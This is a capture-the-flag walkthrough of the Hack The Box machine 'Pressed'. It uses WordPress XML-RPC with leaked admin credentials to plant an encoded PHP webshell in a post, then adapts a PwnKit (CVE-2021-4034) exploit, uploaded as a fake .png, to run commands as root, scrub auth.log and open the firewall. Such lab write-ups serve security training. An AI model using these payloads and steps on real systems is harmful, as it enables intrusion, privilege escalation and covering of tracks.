# HTB: Pressed | 0xdf hacks stuff

* "description":"Pressed presents a unique attack vector on WordPress, where you have access to admin creds right from the start, but can’t log in because of 2FA. This means it’s time to abuse XML-RPC, the thing that wpscan shows as a vulnerability on every WordPress instance, is rarely useful. 

I’ll leak the source for the single post on the site, and see that’s it’s using PHPEverywhere to run PHP from within the post. I’ll edit the post to include a webshell. The firewall is blocking outbound traffic, so I can’t get a reverse shell. 

The box is vulnerable to PwnKit, so I’ll have to modify the exploit to work over the webshell. After leaking the root flag, I’ll go beyond with a Video where I take down the firewall and get a root shell.


# [0xdf hacks stuff](/)

[youtube](https://youtube.com/@0xdf) 
[Gitlab](https://gitlab.com/0xdf/ctfscripts)
[!](https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg)](https://www.buymeacoffee.com/0xdf)

HTB: Pressed
============

[HTB: Pressed](#)

 ![Pressed](/img/pressed-cover.)

Pressed presents a unique attack vector on WordPress, where you have access to admin creds right from the start, but can’t log in because of 2FA. This means it’s time to abuse XML-RPC, the thing that wpscan shows as a vulnerability on every WordPress instance, is rarely useful. I’ll leak the source for the single post on the site, and see that’s it’s using PHPEverywhere to run PHP from within the post. I’ll edit the post to include a webshell. The firewall is blocking outbound traffic, so I can’t get a reverse shell. The box is vulnerable to PwnKit, so I’ll have to modify the exploit to work over the webshell. After leaking the root flag, I’ll go beyond with a Video where I take down the firewall and get a root shell.

Box Info
--------

Name

[Pressed](https://www.hackthebox.eu/home/machines/profile/440)  ![Pressed](/icons/box-pressed.png)

Release Date

3 Feb 2022

Retire Date

3 Feb 2022

OS

Linux ![Linux](/icons/Linux.png)

Base Points

Hard \[40\]

![First Blood User](/icons/first-blood-user.png)

N/A (non-competitive)

![First Blood Root](/icons/first-blood-root.png)

N/A (non-competitive)

Creator

[![](https://www.hackthebox.eu/badge/image/3769)](https://www.hackthebox.eu/home/users/profile/3769)  

Recon
-----

### nmap

`nmap` found one open TCP ports, HTTP (80):

    [email protected]$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.142
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-31 13:09 EST
    Nmap scan report for 10.10.11.142
    Host is up (0.093s latency).
    Not shown: 65534 filtered ports
    PORT   STATE SERVICE
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
    [email protected]$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.142
    \Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-31 13:09 EST
    Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 0.00% done
    Nmap scan report for 10.10.11.142
    Host is up (0.095s latency).
    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-generator: WordPress 5.9
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: UHC Jan Finals &#8211; New Month, New Boxes
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 15.76 seconds
    
    

Based on the and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

### Website - TCP 80

#### Site

Like all the [UHC boxes](https://app.hackthebox.com/tracks/UHC-track), the theme for the site is about the UHC event:

 ![image-20220131201923223](/img/image-20220131201923223.png)

There’s a single post, and clicking on it leads to `http://10.10.11.142/index.php/2022/01/28/hello-world/`, which is an interesting URL because having folders after the `.php` seems weird.

The page itself is presenting a list of User Agent strings, and seem to be updating periodically as I hit the site:

 ![image-20220202204018054](/img/image-20220202204018054.png)

There’s also a comment section at the bottom. If I leave something, it ends up redirecting to `pressed.htb` and failing there. I’ll add that to my `hosts` file, and then the comment posts to the site, but says it’s awaiting moderation:

 ![image-20220131202352966](/img/image-20220131202352966.png)

That’s a good indicator that none of the other players will see it. But it doesn’t rule out a moderate seeing it.

Script and image tags seem to be stripped out.

#### Tech Stack

Looking in Burp at my request history, it’s pretty clear this site is running on WordPress:

 ![image-20220131202750037](/img/image-20220131202750037.png)

This fits the name of the box nicely.

#### wpscan

Given the use of WordPress, I’ll tend to look at things like [wpscan](https://wpscan.com/wordpress-security-scanner) over a directory brute force. There could be value in it, but typically there’s more value in the scan specific to the framework.

I’ll give it my API which I got for free from the WPScan website, and let it run:

    [email protected]$ wpscan --url http://pressed.htb --api-token $WPSCAN_API
    ...[snip]...
    [+] XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%    
     | References:         
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
    ...[snip]...
    [i] Config Backup(s) Identified:
    
    [!] http://pressed.htb/wp-config.php.bak
     | Found By: Direct Access (Aggressive Detection)
    ...[snip]...
    

There’s two important bits in here:

*   There’s a backup config found. I’ll want to check that out for sure.
*   The XML-RPC is enabled. Typically this is something I gloss over. It _can_ be brute forced more easily than the web admin login to try to find creds, but this typically isn’t something done on HTB machines. However, if I find a case where I have creds to login but can’t get into the GUI, it could come in handy.

#### wp-config.php.bak

I’ll grab the config with `wget`, and check it out:

    ...[snip]...
    // ** Database settings - You can get this info from your web host ** //
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress' );
    
    /** Database username */
    define( 'DB_USER', 'admin' );
    
    /** Database password */
    define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );
    
    /** Database hostname */
    define( 'DB_HOST', 'localhost' );
                                                        
    /** Database charset to use in creating database tables. */           
    define( 'DB_CHARSET', 'utf8mb4' );
    
    /** The database collate type. Don't change this if in doubt. */
    define( 'DB_COLLATE', '' );
    ...[snip]...
    

The only really interesting part is the creds to the database connection.

Webshell as www-data
--------------------

### Verifying Admin Creds

I’ll jump over to `/wp-login.php` and see if the DB creds work for the admin user:

 ![image-20220131204232490](/img/image-20220131204232490.png)

They don’t:

 ![image-20220131204246117](/img/image-20220131204246117.png)

I’ll note that the password ends in 2021, and it’s now 2022. I’ll try “uhc-jan-finals-2022”, and it work, kind of:

 ![image-20220131204330633](/img/image-20220131204330633.png)

Now there’s a 2FA prompt, and I don’t have the seed.

### XML-RPC

#### Background

With valid creds but no access to the admin login, I’ll turn to the XML-RPC interface.

The XMLRPC interface for WordPress is an API for interacting with WordPress outside of the typical GUI. Googling for “WordPress XML-RPC” returns _tons_ of posts about how to disable it, and why it’s a security vulnerability. While this may sound promising for me as I’m trying to hack this box, it actually doesn’t amount to much. The general vulnerabilities are either patched or in the denial of service area, not something useful to HackTheBox / UHC use-cases.

The WordPress site has a [list of the typical methods](https://codex.wordpress.org/XML-RPC_WordPress_API) offered via this API. But XMLRPC isn’t specific to WordPress. There are generic methods as well, like `listMethods`. What’s also interesting is that some methods don’t even require auth!

#### Manual RPC Calls

I’ll start with the `listMethods` using the payload from the [documentation](https://codex.wordpress.org/XML-RPC/system.listMethods) and `curl`:

    [email protected]$ curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
    <?xml version="1.0" encoding="UTF-8"?>          
    <methodResponse>
      <params>
        <param>
          <value>
          <array><data>
      <value><string>system.multicall</string></value>
      <value><string>system.listMethods</string></value> 
      <value><string>system.getCapabilities</string></value>
      <value><string>htb.get_flag</string></value>
      <value><string>demo.addTwoNumbers</string></value> 
      <value><string>demo.sayHello</string></value>
    ...[snip]...
      <value><string>wp.getTerms</string></value>
      <value><string>wp.getTerm</string></value>
      <value><string>wp.deleteTerm</string></value>
      <value><string>wp.editTerm</string></value>
      <value><string>wp.newTerm</string></value>
      <value><string>wp.getPosts</string></value>
      <value><string>wp.getPost</string></value>
      <value><string>wp.deletePost</string></value>
      <value><string>wp.editPost</string></value>
      <value><string>wp.newPost</string></value>
      <value><string>wp.getUsersBlogs</string></value>
    </data></array>
          </value>
        </param>
      </params>
    </methodResponse>
    

Right away, one jumps out as interesting, `htb.get_flag`. I’ll try that one:

    [email protected]$ curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
    <?xml version="1.0" encoding="UTF-8"?>
    <methodResponse>
      <params>
        <param>
          <value>
          <string>c4a35cbb3f86e4a37b2782f8b615db5b
    </string>
          </value>
        </param>
      </params>
    </methodResponse>
    

That’s actually the user flag!

I can try something like `wp.getPosts`, but it fails with a 400 for “Insufficient arguments”:

    [email protected]$ curl --data "<methodCall><methodName>wp.getPosts</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
    <?xml version="1.0" encoding="UTF-8"?>
    <methodResponse>
      <fault>
        <value>
          <struct>
            <member>
              <name>faultCode</name>
              <value><int>400</int></value>
            </member>
            <member>
              <name>faultString</name>
              <value><string>Insufficient arguments passed to this XML-RPC method.</string></value>
            </member>
          </struct>
        </value>
      </fault>
    </methodResponse>
    

Looking at the [documentation](https://codex.wordpress.org/XML-RPC_WordPress_API/Posts#wp.getPosts), that one requires a username and password as parameters, and I didn’t give them. It also wants a `blog_id`, and I’m not sure what that is.

#### Python

This interface isn’t intended to be interacted with manually, but rather with a client. There are lots of PHP clients out there, but I prefer working in Python, and there is [python-wordpress-xmlrpc](https://python-wordpress-xmlrpc.readthedocs.io/en/latest/overview.html). After `pip install python-wordpress-xmlrpc`, I’ll drop into a Python REPL:

    [email protected]$ python
    Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
    [GCC 9.3.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>>
    

[This page](https://python-wordpress-xmlrpc.readthedocs.io/en/latest/examples/posts.html#normal-posts) has a nice example calling `GetPosts()`:

    >>> from wordpress_xmlrpc import Client
    >>> from wordpress_xmlrpc.methods import posts
    >>> client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
    >>> plist = client.call(posts.GetPosts())
    >>> plist
    [<WordPressPost: b'UHC January Finals Under Way'>]
    

The resulting object is a (one item long) list of `WordPressPost` objects. To see what I can get from that object, I’ll run `dir` on it:

    >>> dir(plist[0])
    ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_def', 'comment_status', 'content', 'custom_fields', 'date', 'date_modified', 'definition', 'excerpt', 'guid', 'id', 'link', 'menu_order', 'mime_type', 'parent_id', 'password', 'ping_status', 'post_format', 'post_status', 'post_type', 'slug', 'sticky', 'struct', 'terms', 'thumbnail', 'title', 'user']
    

Exploring, there various bits give things like user, password (none), and the link:

    >>> plist[0].user
    '1'
    >>> plist[0].password
    ''
    >>> plist[0].link
    '/index.php/2022/01/28/hello-world/'
    

Curious to see how it is doing the live updates on the User Agent strings, I’ll grab the content:

    >>> plist[0].content
    '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
    

This part is interesting:

    <!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->
    

Decoding that in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)URL_Decode()&input=SlROREpUTkdjR2h3SlRJd0pUSXdaV05vYnlobWFXeGxYMmRsZEY5amIyNTBaVzUwY3lnbkpUSkdkbUZ5SlRKR2QzZDNKVEpHYUhSdGJDVXlSbTkxZEhCMWRDNXNiMmNuS1NrbE0wSWxNakFsTTBZbE0wVT0) (both base64 and url) gives a simple PHP block:

 ![image-20220201081617286](/img/image-20220201081617286.png)

It seems it is running this code to generate the table on the site by reading it from this log file.

[PHP Everywhere](https://wordpress.org/plugins/php-everywhere/) is a WordPress plugin that allows for the running of PHP within WordPress posts. That seems to be what I’m dealing with.

### Write Webshell

Because I have access as the admin user, I can do basically anything over this XML-RPC. But with an eye towards being somewhat stealthy (this is a shared instance, and if I were competing in UHC I wouldn’t want to give away my path to other competitors), I’ll modify the post to contain a webshell that only shows up from my IP:

 ![image-20220201083004841](/img/image-20220201083004841.png)

I’ll get the `Post` instance in Python and modify the content:

    >>> mod_post = plist[0]
    >>> mod_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDP3BocCUyMCUwQSUyMCUyMGVjaG8oZmlsZV9nZXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvb3V0cHV0LmxvZycpKTslMjAlMEElMjAlMjBpZiUyMCgkX1NFUlZFUiU1QidSRU1PVEVfQUREUiclNUQlMjA9PSUyMCcxMC4xMC4xNC42JyklMjAlN0IlMEElMjAlMjAlMjAlMjBzeXN0ZW0oJF9SRVFVRVNUJTVCJ2NtZCclNUQpOyUwQSUyMCUyMCU3RCUyMCUwQT8lM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
    >>> client.call(posts.EditPost(mod_post.id, mod_post))
    

If I refresh that post, it looks the same. But if I add `?cmd=id` to the end:

 ![image-20220201083215460](/img/image-20220201083215460.png)

### Script

I want a script to more easily interact with the webshell, so I’ll write a quick curl command and wrap that into a `bash` script to run easily:

    #!/bin/bash
    
    curl -d "cmd=$1" -s 'http://pressed.htb/index.php/2022/01/28/hello-world/' |
            awk '/<\/table>/{flag=1;next}/<p><\/p>/{flag=0}flag' |
            sed 's/&#8211;/--/g' | sed 's/&#8212;/---/g' |
            head -n -3
    

Here’s the [process for making that](https://www.youtube.com/watch?v=WmQFRNphbps):

Shell as root
-------------

### Enumeration

#### Connectivity

When all my attempts to get a reverse shell failed, I turned back to just trying to connect back to my host from Pressed.

There doesn’t seem to be any way to connect back. `curl` and `nc` both just hang trying to connect back. Even `ping` failed:

    [email protected]$ ./webshell.sh 'ping -c 1 10.10.14.6'
    PING 10.10.14.6 (10.10.14.6) 56(84) bytes of data.
    
    --- 10.10.14.6 ping statistics ---
    1 packets transmitted, 0 received, 100% packet loss, time 0ms
    

Looks like I’ll need to enumerate the box using the webshell.

#### PwnKit

I know that UHC likes to show off the current trending vulnerabilities, and [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) (CVE-2021-4034) is certainly one of those. Unfortunately, when `pkexec` was patched for PwnKit, they didn’t change the version number, so there’s no way to tell from the version if it it patched or not. However, I can look at timestamps:

    [email protected]$ ./webshell.sh 'which pkexec'
    /usr/bin/pkexec
    [email protected]$ ./webshell.sh 'ls -l /usr/bin/pkexec'
    -rwsr-xr-x 1 root root 31032 Jul 14  2021 /usr/bin/pkexec
    

If this binary was last modified last July, then it’s very unlikely that it’s patched in early 2022.

### PwnKit Exploit

#### POC Exploit

There are a bunch of exploits out there. I went with [this one](https://github.com/kimusan/pkwner?ref=pythonawesome.com) as a shell script that will generate and run the payload. I’ll download the script, and I’ll have to modify it a bit. Since I’m just running from a webshell, I can’t have the result be a root shell. Instead, I’ll have to put the command I want in the script. To test, I’ll run `id`, putting it in the place of `/bin/bash` in what’s written to `pkwner.c` here:

    cat > pkwner/pkwner.c <<- EOM
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    void gconv() {}
    void gconv_init() {
      printf("hello");
      setuid(0); setgid(0);
            seteuid(0); setegid(0);
      system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
             "rm -rf 'GCONV_PATH=.' 'pkwner';"
             "cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;"
             "id");
            exit(0);
    }
    EOM
    

#### Upload

There is a `wp.uploadFile` method in WordPress XML-RPC which I found the general syntax for [here](https://gist.github.com/georgestephanis/5681982). I couldn’t find it in the [docs](https://python-wordpress-xmlrpc.readthedocs.io/en/latest/index.html) for the Python client, but it is in the [code](https://github.com/maxcutler/python-wordpress-xmlrpc/blob/7ac0a6e9934fdbf02c2250932e0c026cf530d400/wordpress_xmlrpc/methods/media.py#L39). There’s also a [test for uploading a file](https://github.com/maxcutler/python-wordpress-xmlrpc/blob/7ac0a6e9934fdbf02c2250932e0c026cf530d400/tests/test_media.py#L35), which I can use as a model.

In the same Python terminal I’ve been working out of (with a client already connected), I’ll import `media`, and then create a `data` object:

    >>> from wordpress_xmlrpc.methods import media
    >>> with open('pkwner.sh', 'r') as f:
    ...     script = f.read()
    ... 
    >>> data = { 'name': 'pkwner.sh', 'bits': script, 'type': 'text/plain' }
    

On sending this, there’s an error:

    >>> client.call(media.UploadFile(data))
    Traceback (most recent call last):
    ...[snip]...
    xmlrpc.client.Fault: <Fault 500: 'Could not write file pkwner.sh (Sorry, you are not allowed to upload this file type.).'>
    

The file type seems like a `type` issue, so I’ll change it to something I probably can upload, `image/png`, but I get the same error. I’ll try changing the file extension to `.png`, and it works:

    >>> data = { 'name': 'pkwner.png', 'bits': script, 'type': 'text/plain' }
    >>> client.call(media.UploadFile(data))
    {'attachment_id': '48', 'date_created_gmt': <DateTime '20220201T23:14:24' at 0x7f25f8bb9a60>, 'parent': 0, 'link': '/wp-content/uploads/2022/02/pkwner.png', 'title': 'pkwner.png', 'caption': '', 'description': '', 'metadata': False, 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2022/02/pkwner.png', 'id': '48', 'file': 'pkwner.png', 'url': '/wp-content/uploads/2022/02/pkwner.png'}
    

It’s even nice enough to give me the full path!

#### POC Success

I can just call `bash` on that file (even with the `.png` extension, though I could also move it with the webshell), and it works:

    [email protected]$ ./webshell.sh 'bash /var/www/html/wp-content/uploads/2022/02/pkwner.png'
    ██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
    ██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
    ██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
    ██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
    ██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    CVE-2021-4034 PoC by Kim Schulz
    [+] Setting up environment&#8230;
    [+] Build offensive gconv shared module&#8230;
    [+] Build mini executor&#8230;
    uid=0(root) gid=0(root) groups=0(root),33(www-data)
    hello[+] Nice Job
    

Because it prints out `uid=0`, that shows it ran as root.

#### Get Flag

I can remove the image from the server (with the webshell) change the last line in my local copy to `cat /root/root.txt`, upload it again, and run it to get the flag:

    [email protected]$ ./webshell.sh 'bash /var/www/html/wp-content/uploads/2022/02/pkwner.png'
    ██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
    ██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
    ██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
    ██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
    ██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    CVE-2021-4034 PoC by Kim Schulz
    [+] Setting up environment&#8230;
    [+] Build offensive gconv shared module&#8230;
    [+] Build mini executor&#8230;
    8620df0d9701b220a6fcbc207fca5cc1
    hello[+] Nice Job
    

### Shell

To get a shell, there are a few things I could try. One idea would be to script a forward shell. I’ve shown this before (though not in a while) in [Stratosphere](/2018/09/01/htb-stratosphere.html#building-a-shell) and [Scavenger](/2020/02/29/htb-scavenger.html#stateful-shell).

I’m going to take a different tact today and enumerate and `iptables` and poke a hole for myself.

I managed to succeed using these two commands:

    iptables -A OUTPUT -p tcp -d 10.10.14.6 -j ACCEPT
    iptables -A INPUT -p tcp -s 10.10.14.6 -j ACCEPT
    

Here’s the [video](https://www.youtube.com/watch?v=9xX2ASQgpSU):

[](/2022/02/03/htb-pressed.html)

0xdf hacks stuff
----------------

*   0xdf hacks stuff
*   [\[email protected\]](/cdn-cgi/l/email-protection#eede968a88c0dcdcddae89838f8782c08d8183)

*   [0xdf\_](https://www.twitter.com/0xdf_)
*   [0xdf](https://youtube.com/channel/UChO9OAH57Flz35RRX__E25A)
*   [feed](/feed.xml)
*   [![HTB](/assets/icons/htb-favicon.png)0xdf](https://www.hackthebox.eu/home/users/profile/4935)

CTF solutions, malware analysis, home lab development

[![Buy me a coffee](https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg)Buy me a coffee](https://www.buymeacoffee.com/0xdf)

!function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments); },s.version='1.1',s.queue=\[\],u=t.createElement(n),u.async=!0,u.src='//static.ads-twitter.com/uwt.js', a=t.getElementsByTagName(n)\[0\],a.parentNode.insertBefore(u,a))}(window,document,'script'); // Insert Twitter Pixel ID and Standard Event data below twq('init','o42o1'); twq('track','PageView');
